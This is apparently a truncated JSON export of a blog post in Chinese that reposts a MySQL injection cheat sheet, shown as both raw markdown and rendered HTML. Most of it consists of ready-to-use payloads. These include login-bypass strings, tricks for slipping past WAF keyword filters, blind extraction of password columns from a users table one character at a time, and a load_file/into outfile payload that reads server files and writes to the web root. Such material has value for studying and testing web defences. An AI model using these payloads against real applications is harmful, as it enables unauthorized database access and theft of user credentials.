ceil(ceil(pi())*version()) 21   L\ntrue+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M\nfloor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N\nceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O\nfloor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P\nceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q\nceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R\nfloor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S\nfloor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T\n```\n\n更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考\n\n```\nhttp://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf\n\nhttps://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf\n\nhttp://www.blackhatlibrary.net/SQL_injection\n\nhttp://websec.ca/kb/sql_injection\n```\n</style>\n","source":"_posts/MySQL注入技巧.md","raw":"---\ntitle: MySQL注入技巧\ncover: https://img0.baidu.com/it/u=2009713656,733522492&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800\nswiper_index: 10\ntop_group_index: 10\nbackground: '#fff'\ndate: 2025-03-20 10:43:02\nupdated:\ntags: 攻防知识\ncategories:\nkeywords:\ndescription:\ntop:\ntop_img:\ncomments:\ntoc:\ntoc_number:\ntoc_style_simple:\ncopyright:\ncopyright_author: 转载\ncopyright_author_href:\ncopyright_url:\ncopyright_info:\nmathjax:\nkatex:\naplayer:\nhighlight_shrink:\naside:\nai:\n---\n# 0x01 MYSQl灵活的语法\n\n***\n\n**1 MySQL语法以及认证绕过**\n\n注释符：\n\n```\n#， \n-- X(X为任意字符)\n/*(MySQL-5.1)\n;%00\n`\n'or 1=1;%00\n'or 1=1 union select 1,2`'\n'or 1=1 #\n'/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138\n'/*!or*/ 1=1 -- -\n```\n\n前缀：\n\n任意混合 `+ - ~ !`\n\n```\n'or --+2=- -!!!'2\n```\n\n测试后发现`and/or`后面可以跟上偶数个`!、~`可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略\n\n```\n'or- -!!!1=1；\n```\n\n运算符：\n\n```\n^, =, !=, %, /, *, &, &&, |, ||, <, >, <<, >>, >=, <=, <>, <=>, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……\n\n'or 1 rlike '1\n```\n\n空格替换：`%20, %09, %0a, %0b, %0c, %0d, %a0`\n\n也可以插入括号，前缀，操作符，引号\n\n```\n'or+(1)sounds/**/like\"1\"--%a0-\n```\n\n字符串格式\n\n```\n    ' or \"a\"='a'\n    ' or 'a'=n'a'               //unicode\n    ' or 'a'=b'1100001'         //binary\n    ' or 'a'=_binary'1100001'   //5.5.41下测试无效\n    ' or 'a'=x'61'              //16进制\n```\n\n**2、MySQL常用的一些小工具**\n\n常量：`true， false， null， \\N, current_timestamp....`\n\n变量：`@myvar:=1`\n\n系统变量：`@@version, @@datadir....`\n\n常用函数：`version(), pi(), pow(), char(), substring()....`\n\n**3、MySQL类型转换**\n\n```\n' or 1=true #true=1, false=0\n' or 1 #true\n' or version()=5.5 #5.5.41-log\n\n' or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4\n\nselect * from users where 'a'='b'='c'\nselect * from users where ('a'='b')='c'\nselect * from users where (false)='c'\nselect * from users where (0)='c'\nselect * from users where (0)=0\nselect * from users where true\nselect * from users\n```\n\n以上的语句都是同样的效果\n\n**4、认证绕过**\n\n绕过语句：`'='`\n\n```\nselect data from users where name=\"=\"\nselect data from users where flase=\" \nselect data from users where 0=0\n```\n\n绕过语句：`'-'`\n\n```\nselect data from users where name=''-''\nselect data from users where name=0-0\nselect data from users where 0=0\n```\n\n# 0x02 关键字过滤\n\n***\n\n空格\n\n过滤代码`/\\s/`\n\n```\n%20, %09, %0a, %0b, %0c, %0d, %a0\n```\n\n关键字`OR，AND`\n\n过滤代码`/\\sor\\s/i,/\\sand\\s/i`\n\n```\n'||1='1     #or\n'='\n'&&1='1     #and\n```\n\n关键字`union select`\n\n过滤代码`/union\\s+select/i`\n\n```\n'and(true)like(false)union(select(pass)from(users))#\n'union [all|distinct] select pass from users#\n'union%a0select pass from users#\n'union/*!select*/pass from users#\n/vuln.php?id=1 union/*&sort=*/select pass from users-- -\n```\n\n如果单独过滤union,使用盲注来获取数据\n\n```\n'and(select pass from users limit 1)='secret\n```\n\n通过子查询获取单值来进行比较\n\n关键字`limit`\n\n过滤代码`/limit/i`\n\n```\n'and(select pass from users where id=1)='a\n'and(select pass from users group by id having id=1)='a\n'and length((select pass from users having substr(pass,1,1)='a'))\n```\n\n关键字`having`\n\n过滤代码`/having/i`\n\n```\n'and(select substr(group_concat(pass),1,1)from users)='a\n```\n\n关键字`select ... from`\n\n过滤代码`/SELECT\\s+[A-Za-z.]+\\s+FROM/i/i`\n\n```\nselect [all|distinct] pass from users\nselect`table_name`from`information_schema` . `tables`\nselect pass as alias from users\nselect pass aliasalias from users\nselect pass`alias alias`from users\nselect+pass%a0from(users)\n```\n\n关键字`select`\n\n过滤代码`/select/i`\n\n### 1 有文件读取权限\n\n```\n' and substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+\nlength('DocumentRoot'),10)='a'='' into outfile '/var/www/dump.txt\n```\n\n### 2 获取列名\n\n```\n' and 列名 is not null#\n' procedure analyse()#\n```\n\n使用substr来做过滤条件\n\n```\n'and substr(pass,1,1)='a\n```\n\n关键字`select,and,&`\n\n'0#\n\n```\nselect data from users where name = ''-0 # int typecast\nselect data from users where name = 0 # int typecast\nselect data from users where 0 = 0 # true\n```\n\n'-1#\n\n```\nselect data from users where 0 = -1 # false\n```\n\n使用条件判断来进行`true、false`的选择\n\n```\n    ifnull(nullif()), case when， if()\n    '-if(name='Admin',1,0)#\n```\n\n使用嵌套条件`'-if(`\n\n```\nif(name='Admin',1,0), // condition\nif(substr(pass,1,1)='a',1,0) // if true\n,0)# // if false    \n```\n\n# 0x03 函数过滤\n\n***\n\n构建字符串相关函数\n\n```\nunhex char hex ascii ord substr substring mid pad left right insert\n' and substr(data,1,1) = 'a'#\n' and substr(data,1,1) = 0x61# 0x6162\n' and substr(data,1,1) = unhex(61)# unhex(6162)\n' and substr(data,1,1) = char(97)# char(97,98)\n' and hex(substr(data,1,1)) = 61#\n' and ascii(substr(data,1,1)) = 97#\n' and ord(substr(data,1,1)) = 97#\n```\n\n使用conv来进行进制的转换\n\n```\n' and substr(data,1,1) = lower(conv(10,10,36))# 'a'\n' and substr(data,1,1) = lower(conv(11,10,36))# 'b'\n' and substr(data,1,1) = lower(conv(36,10,36))# 'z'\n```\n\n使用函数来猜解数据\n\n```\n' and substr(data,1,1) = 'a'#\n' and substring(data,1,1) = 'a'#\n' and mid(data,1,1) = 'a'#\n```\n\n不适用逗号来获取\n\n```\n' and substr(data from 1 for 1) = 'a'#\n```\n\n同样也可以使用一下比较少见的函数来尝试绕过\n\n```\nlpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'\nrpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'\nleft(data,1)\nreverse(right(reverse(data),1))\ninsert(insert(version(),1,0,space(0)),2,222,space(0))\n```\n\n有些函数有类似搜索匹配的功能\n\n```\n'-if(locate('f',data),1,0)#\n'-if(locate('fo',data),1,0)#\n'-if(locate('foo',data),1,0)#\ninstr(), position()\n```\n\n使用函数进行字符串的切割\n\n```\nlength(trim(leading 'a' FROM data)) # length will be shorter\nlength(replace(data, 'a', '')) # length will be shorter\n```\n\n2种方式都是相同效果\n\n# 0x04 注入时主要使用的一些东西\n\n***\n\n```\n1个控制流程操作(select, case, if(), ...)\n1个比较操作(=, like, mod(), ...)\n1个字符串的猜解(mid(), left(), rpad(), …)\n1个字符串生成(0x61, hex(), conv())\n```\n\n使用`conv([10-36],10,36)`可以实现所有字符的表示\n\n```\nfalse !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K\ntrue !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L\ntrue+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M\nfloor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N\nceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O\nfloor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P\nceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q\nceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R\nfloor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S\nfloor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T\n```\n\n更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考\n\n```\nhttp://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf\n\nhttps://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf\n\nhttp://www.blackhatlibrary.net/SQL_injection\n\nhttp://websec.ca/kb/sql_injection\n```\n</style>\n","slug":"MySQL注入技巧","published":1,"layout":"post","photos":[],"_id":"cm8iuwsr00001rcn1bqy3f252","content":"<h1 id=\"0x01-MYSQl灵活的语法\"><a href=\"#0x01-MYSQl灵活的语法\" class=\"headerlink\" title=\"0x01 MYSQl灵活的语法\"></a>0x01 MYSQl灵活的语法</h1><hr>\n<p><strong>1 MySQL语法以及认证绕过</strong></p>\n<p>注释符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#， </span><br><span class=\"line\">-- X(X为任意字符)</span><br><span class=\"line\">/*(MySQL-5.1)</span><br><span class=\"line\">;%00</span><br><span class=\"line\">`</span><br><span class=\"line\">&#x27;or 1=1;%00</span><br><span class=\"line\">&#x27;or 1=1 union select 1,2`&#x27;</span><br><span class=\"line\">&#x27;or 1=1 #</span><br><span class=\"line\">&#x27;/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138</span><br><span class=\"line\">&#x27;/*!or*/ 1=1 -- -</span><br></pre></td></tr></table></figure>\n\n<p>前缀：</p>\n<p>任意混合 <code>+ - ~ !</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or --+2=- -!!!&#x27;2</span><br></pre></td></tr></table></figure>\n\n<p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and&#x2F;or前的空格可以省略</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or- -!!!1=1；</span><br></pre></td></tr></table></figure>\n\n<p>运算符：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &lt;, &gt;, &lt;&lt;, &gt;&gt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;or 1 rlike &#x27;1</span><br></pre></td></tr></table></figure>\n\n<p>空格替换：<code>%20, %09, %0a, %0b, %0c, %0d, %a0</code></p>\n<p>也可以插入括号，前缀，操作符，引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;or+(1)sounds/**/like&quot;1&quot;--%a0-</span><br></pre></td></tr></table></figure>\n\n<p>字符串格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; or &quot;a&quot;=&#x27;a&#x27;</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=n&#x27;a&#x27;               //unicode</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=b&#x27;1100001&#x27;         //binary</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=_binary&#x27;1100001&#x27;   //5.5.41下测试无效</span><br><span class=\"line\">&#x27; or &#x27;a&#x27;=x&#x27;61&#x27;              //16进制</span><br></pre></td></tr></table></figure>\n\n<p><strong>2、MySQL常用的一些小工具</strong></p>\n<p>常量：<code>true， false， null， \\N, current_timestamp....</code></p>\n<p>变量：<code>@myvar:=1</code></p>\n<p>系统变量：<code>@@version, @@datadir....</code></p>\n<p>常用函数：<code>version(), pi(), pow(), char(), substring()....</code></p>\n<p><strong>3、MySQL类型转换</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; or 1=true #true=1, false=0</span><br><span class=\"line\">&#x27; or 1 #true</span><br><span class=\"line\">&#x27; or version()=5.5 #5.5.41-log</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27; or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4</span><br><span class=\"line\"></span><br><span class=\"line\">select * from users where &#x27;a&#x27;=&#x27;b&#x27;=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (&#x27;a&#x27;=&#x27;b&#x27;)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (false)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (0)=&#x27;c&#x27;</span><br><span class=\"line\">select * from users where (0)=0</span><br><span class=\"line\">select * from users where true</span><br><span class=\"line\">select * from users</span><br></pre></td></tr></table></figure>\n\n<p>以上的语句都是同样的效果</p>\n<p><strong>4、认证绕过</strong></p>\n<p>绕过语句：<code>&#39;=&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name=&quot;=&quot;</span><br><span class=\"line\">select data from users where flase=&quot; </span><br><span class=\"line\">select data from users where 0=0</span><br></pre></td></tr></table></figure>\n\n<p>绕过语句：<code>&#39;-&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name=&#x27;&#x27;-&#x27;&#x27;</span><br><span class=\"line\">select data from users where name=0-0</span><br><span class=\"line\">select data from users where 0=0</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x02-关键字过滤\"><a href=\"#0x02-关键字过滤\" class=\"headerlink\" title=\"0x02 关键字过滤\"></a>0x02 关键字过滤</h1><hr>\n<p>空格</p>\n<p>过滤代码<code>/\\s/</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%20, %09, %0a, %0b, %0c, %0d, %a0</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>OR，AND</code></p>\n<p>过滤代码<code>/\\sor\\s/i,/\\sand\\s/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;||1=&#x27;1     #or</span><br><span class=\"line\">&#x27;=&#x27;</span><br><span class=\"line\">&#x27;&amp;&amp;1=&#x27;1     #and</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>union select</code></p>\n<p>过滤代码<code>/union\\s+select/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(true)like(false)union(select(pass)from(users))#</span><br><span class=\"line\">&#x27;union [all|distinct] select pass from users#</span><br><span class=\"line\">&#x27;union%a0select pass from users#</span><br><span class=\"line\">&#x27;union/*!select*/pass from users#</span><br><span class=\"line\">/vuln.php?id=1 union/*&amp;sort=*/select pass from users-- -</span><br></pre></td></tr></table></figure>\n\n<p>如果单独过滤union,使用盲注来获取数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select pass from users limit 1)=&#x27;secret</span><br></pre></td></tr></table></figure>\n\n<p>通过子查询获取单值来进行比较</p>\n<p>关键字<code>limit</code></p>\n<p>过滤代码<code>/limit/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select pass from users where id=1)=&#x27;a</span><br><span class=\"line\">&#x27;and(select pass from users group by id having id=1)=&#x27;a</span><br><span class=\"line\">&#x27;and length((select pass from users having substr(pass,1,1)=&#x27;a&#x27;))</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>having</code></p>\n<p>过滤代码<code>/having/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and(select substr(group_concat(pass),1,1)from users)=&#x27;a</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select ... from</code></p>\n<p>过滤代码<code>/SELECT\\s+[A-Za-z.]+\\s+FROM/i/i</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select [all|distinct] pass from users</span><br><span class=\"line\">select`table_name`from`information_schema` . `tables`</span><br><span class=\"line\">select pass as alias from users</span><br><span class=\"line\">select pass aliasalias from users</span><br><span class=\"line\">select pass`alias alias`from users</span><br><span class=\"line\">select+pass%a0from(users)</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select</code></p>\n<p>过滤代码<code>/select/i</code></p>\n<h3 id=\"1-有文件读取权限\"><a href=\"#1-有文件读取权限\" class=\"headerlink\" title=\"1 有文件读取权限\"></a>1 有文件读取权限</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(load_file(&#x27;file&#x27;),locate(&#x27;DocumentRoot&#x27;,(load_file(&#x27;file&#x27;)))+</span><br><span class=\"line\">length(&#x27;DocumentRoot&#x27;),10)=&#x27;a&#x27;=&#x27;&#x27; into outfile &#x27;/var/www/dump.txt</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-获取列名\"><a href=\"#2-获取列名\" class=\"headerlink\" title=\"2 获取列名\"></a>2 获取列名</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and 列名 is not null#</span><br><span class=\"line\">&#x27; procedure analyse()#</span><br></pre></td></tr></table></figure>\n\n<p>使用substr来做过滤条件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;and substr(pass,1,1)=&#x27;a</span><br></pre></td></tr></table></figure>\n\n<p>关键字<code>select,and,&amp;</code></p>\n<p>‘0#</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where name = &#x27;&#x27;-0 # int typecast</span><br><span class=\"line\">select data from users where name = 0 # int typecast</span><br><span class=\"line\">select data from users where 0 = 0 # true</span><br></pre></td></tr></table></figure>\n\n<p>‘-1#</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select data from users where 0 = -1 # false</span><br></pre></td></tr></table></figure>\n\n<p>使用条件判断来进行<code>true、false</code>的选择</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ifnull(nullif()), case when， if()</span><br><span class=\"line\">&#x27;-if(name=&#x27;Admin&#x27;,1,0)#</span><br></pre></td></tr></table></figure>\n\n<p>使用嵌套条件<code>&#39;-if(</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(name=&#x27;Admin&#x27;,1,0), // condition</span><br><span class=\"line\">if(substr(pass,1,1)=&#x27;a&#x27;,1,0) // if true</span><br><span class=\"line\">,0)# // if false    </span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-函数过滤\"><a href=\"#0x03-函数过滤\" class=\"headerlink\" title=\"0x03 函数过滤\"></a>0x03 函数过滤</h1><hr>\n<p>构建字符串相关函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unhex char hex ascii ord substr substring mid pad left right insert</span><br><span class=\"line\">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and substr(data,1,1) = 0x61# 0x6162</span><br><span class=\"line\">&#x27; and substr(data,1,1) = unhex(61)# unhex(6162)</span><br><span class=\"line\">&#x27; and substr(data,1,1) = char(97)# char(97,98)</span><br><span class=\"line\">&#x27; and hex(substr(data,1,1)) = 61#</span><br><span class=\"line\">&#x27; and ascii(substr(data,1,1)) = 97#</span><br><span class=\"line\">&#x27; and ord(substr(data,1,1)) = 97#</span><br></pre></td></tr></table></figure>\n\n<p>使用conv来进行进制的转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(10,10,36))# &#x27;a&#x27;</span><br><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(11,10,36))# &#x27;b&#x27;</span><br><span class=\"line\">&#x27; and substr(data,1,1) = lower(conv(36,10,36))# &#x27;z&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>使用函数来猜解数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and substring(data,1,1) = &#x27;a&#x27;#</span><br><span class=\"line\">&#x27; and mid(data,1,1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure>\n\n<p>不适用逗号来获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; and substr(data from 1 for 1) = &#x27;a&#x27;#</span><br></pre></td></tr></table></figure>\n\n<p>同样也可以使用一下比较少见的函数来尝试绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lpad(data,1,space(1)) // lpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;??hi&#x27;</span><br><span class=\"line\">rpad(data,1,space(1)) // rpad(&#x27;hi&#x27;,4,&#x27;?&#x27;) = &#x27;hi??&#x27;</span><br><span class=\"line\">left(data,1)</span><br><span class=\"line\">reverse(right(reverse(data),1))</span><br><span class=\"line\">insert(insert(version(),1,0,space(0)),2,222,space(0))</span><br></pre></td></tr></table></figure>\n\n<p>有些函数有类似搜索匹配的功能</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;-if(locate(&#x27;f&#x27;,data),1,0)#</span><br><span class=\"line\">&#x27;-if(locate(&#x27;fo&#x27;,data),1,0)#</span><br><span class=\"line\">&#x27;-if(locate(&#x27;foo&#x27;,data),1,0)#</span><br><span class=\"line\">instr(), position()</span><br></pre></td></tr></table></figure>\n\n<p>使用函数进行字符串的切割</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">length(trim(leading &#x27;a&#x27; FROM data)) # length will be shorter</span><br><span class=\"line\">length(replace(data, &#x27;a&#x27;, &#x27;&#x27;)) # length will be shorter</span><br></pre></td></tr></table></figure>\n\n<p>2种方式都是相同效果</p>\n<h1 id=\"0x04-注入时主要使用的一些东西\"><a href=\"#0x04-注入时主要使用的一些东西\" class=\"headerlink\" title=\"0x04 注入时主要使用的一些东西\"></a>0x04 注入时主要使用的一些东西</h1><hr>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1个控制流程操作(select, case, if(), ...)</span><br><span class=\"line\">1个比较操作(=, like, mod(), ...)</span><br><span class=\"line\">1个字符串的猜解(mid(), left(), rpad(), …)</span><br><span class=\"line\">1个字符串生成(0x61, hex(), conv())</span><br></pre></td></tr></table></figure>\n\n<p>使用<code>conv([10-36],10,36)</code>可以实现所有字符的表示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class=\"line\">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class=\"line\">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class=\"line\">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class=\"line\">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class=\"line\">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class=\"line\">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class=\"line\">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class=\"line\">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class=\"line\">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure>\n\n<p>更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考</p>\n<figure class=\"highlight 